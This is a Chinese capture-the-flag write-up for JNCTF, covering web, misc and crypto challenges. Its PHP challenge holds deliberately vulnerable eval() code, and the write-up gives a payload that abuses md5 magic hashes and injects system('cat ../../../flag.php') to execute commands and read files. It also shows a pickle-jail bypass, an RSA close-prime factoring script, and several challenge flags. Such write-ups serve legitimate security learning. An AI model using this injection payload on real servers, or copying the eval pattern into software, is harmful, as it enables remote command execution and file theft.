class="hljs-number">0x0E</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xDF</span>,<br>    <span class="hljs-number">0xED</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF6</span>,<br>    <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3A</span>,<br>    <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x89</span><br>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">key, data</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># Key scheduling</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-comment"># Pseudo-random generation</span><br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(byte ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br>decrypted = rc4_decrypt(key, enc)<br><span class="hljs-built_in">print</span>(decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-eateateat"><a href="#1-eateateat" class="headerlink" title="1. eateateat"></a>1. eateateat</h3><p>小游戏，没什么好说的，直接看源码就秒了</p><p><img src="/../images/1/image-20250323194143037.png" alt="image-20250323194143037"></p><h3 id="2-test-php"><a href="#2-test-php" class="headerlink" title="2.test php"></a>2.test php</h3><p>先贴源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;活在当下2025，但好像不对？？？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;哥们，这是年份，你在干嘛！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>)==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;咦，居然被你猜对了，还得是2025!&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;新年快乐啊！但送不了你flag！&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这才是第一关通过了！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;JNSEC&#x27;</span>] == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;???这都被你猜对了？？&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;但这好像只是第二关！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$d</span> !== <span class="hljs-variable">$e</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$d</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$e</span>))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你！好像就马上要成功了！&quot;</span>;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>        <span class="hljs-comment">// flag在当前目录下的flag文件中</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new Reflection(<span class="hljs-subst">$f</span>());&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第三部分可以用md5碰撞，然后给f赋值为system(‘ls -al’)一类的命令来看目录，找到flag后cat一下就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">a=JNSEC=202cb962ac59075b964b07152d234b70&amp;c=123&amp;d=QNKCDZO&amp;e=240610708&amp;f=system(&#x27;cat%20../../../flag.php&#x27;)<br></code></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p><del>唉，misc就是一坨</del></p><h3 id="1-stego"><a href="#1-stego" class="headerlink" title="1. stego"></a>1. stego</h3><p>stego.qoi一个少见的图片格式，去网上找找github的qoi格式转换，把格式换回来就能看见flag</p><p><a href="https://github.com/phoboslab/qoi">phoboslab&#x2F;qoi: The “Quite OK Image Format” for fast, lossless image compression</a></p><h3 id="2-ez-pickle-jail"><a href="#2-ez-pickle-jail" class="headerlink" title="2.ez_pickle_jail"></a>2.ez_pickle_jail</h3><p>是一个python沙箱，可以利用低版本的pickle数据，这样在反序列后再转序列化就会导致内容不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br>pickle_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter the base64 encoded pickle: &quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    pickle_data = base64.b64decode(pickle_input)<br><span class="hljs-keyword">except</span> binascii.Error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 encoding&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">try</span>:<br>    data = pickle.loads(pickle_data)<br><span class="hljs-keyword">except</span> pickle.UnpicklingError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid pickle data&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br>pickle_output = pickle.dumps(data)<br><span class="hljs-keyword">if</span> pickle_output != pickle_data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read())<br><span class="hljs-comment"># too many solutions,isn&#x27;t it?</span><br><br><br><br>JNCTF&#123;hhhhTh1s_Re@1_E@sy_P7P1111&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-number">0</span><br>pickle_data = pickle.dumps(data, protocol=<span class="hljs-number">0</span>)<br>encoded = base64.b64encode(pickle_data).decode()<br><span class="hljs-built_in">print</span>(encoded)<br></code></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="1-story"><a href="#1-story" class="headerlink" title="1.story"></a>1.story</h3><p>给了一大段换表后的文本，这里可以直接就让大语言模型帮忙完成统计爆破</p><h3 id="2-悲伤的故事（有点像misc了）"><a href="#2-悲伤的故事（有点像misc了）" class="headerlink" title="2. 悲伤的故事（有点像misc了）"></a>2. 悲伤的故事（有点像misc了）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plant">这是一个悲伤的故事，他眼含泪水推开酒吧那扇厚重的门，脑中还不断回荡着酒吧里的各种乐器声，在酒精的麻痹下，他浑浑噩噩的走到了家中，看着小院栅栏中的鸟语花香，他又回想起曾经的那段时光，但他知道，他该放下了，就这样，他回到了自己的房间里，发现桌上有着一个古典雅致的盒子，他瞬间清醒了不少，激动的连忙赶过去，用钥匙打开，里面是封古典的信件，他双手颤抖着打开这封信：<br>亲爱的维吉！<br>三年了，你是否还记得“VERSd3FASFhjUkpyX19tMTFAQXsxMUdfX199”是什么意思，如果心中有那答案，就来找我吧。<br><br></code></pre></td></tr></table></figure><p>在文本里能看出有栅栏加密（offset&#x3D;3），base64，维吉尼亚加密。</p><p>base64之后：TDRwq@HXcRJr__m11@A{11G___}</p><p>栅栏解密：TRADJ{Rr1w_1q_G@m_H1_X1_c@}</p><p>根据JNCTF{}的flag格式，可以推断出密钥就是key</p><p>最后维吉尼亚解密：JNCTF{Th1s_1s_W@i_J1_N1_y@}</p><h3 id="3-熟悉的故人"><a href="#3-熟悉的故人" class="headerlink" title="3. 熟悉的故人"></a>3. 熟悉的故人</h3><p>源码：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import libnum<br>import gmpy2<br>import random<br>from secrets import FLAG<br><br>p = libnum.generate_prime(1024 + random.randint(0, 1024))<br>q = gmpy2.next_prime(p)<br>e = 65537<br>m = FLAG<br>m = libnum.s2n(m)<br>n = p*q<br>phi_n = (p-1)*(q-1)<br>d = libnum.invmod(e,phi_n)<br>c = pow(m,e,n)<br><br>print(<span class="hljs-string">&quot;n =&quot;</span>,n)<br>print (<span class="hljs-string">&quot;e =&quot;</span>,e)<br>print (<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br><span class="hljs-comment"># n = 299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br><span class="hljs-comment"># e = 65537</span><br><span class="hljs-comment"># c = 173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br></code></pre></td></tr></table></figure><p>RSA，直接脚本秒了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br><br>s = gmpy2.isqrt(n)<br>found = <span class="hljs-literal">False</span><br>p = <span class="hljs-literal">None</span><br>q = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    current = s - i<br>    <span class="hljs-keyword">if</span> n % current == <span class="hljs-number">0</span>:<br>        p = current<br>        q = n // current<br>        <span class="hljs-keyword">if</span> gmpy2.is_prime(p) <span class="hljs-keyword">and</span> gmpy2.is_prime(q) <span class="hljs-keyword">and</span> gmpy2.next_prime(p) == q:<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> found:<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = gmpy2.invert(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag.decode())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到合适的因数。&quot;</span>)<br><br><span class="hljs-comment"># JNCTF&#123;Is_just_another_RSA&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>没把ezbase打出来可惜了，re也没做出来多少</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
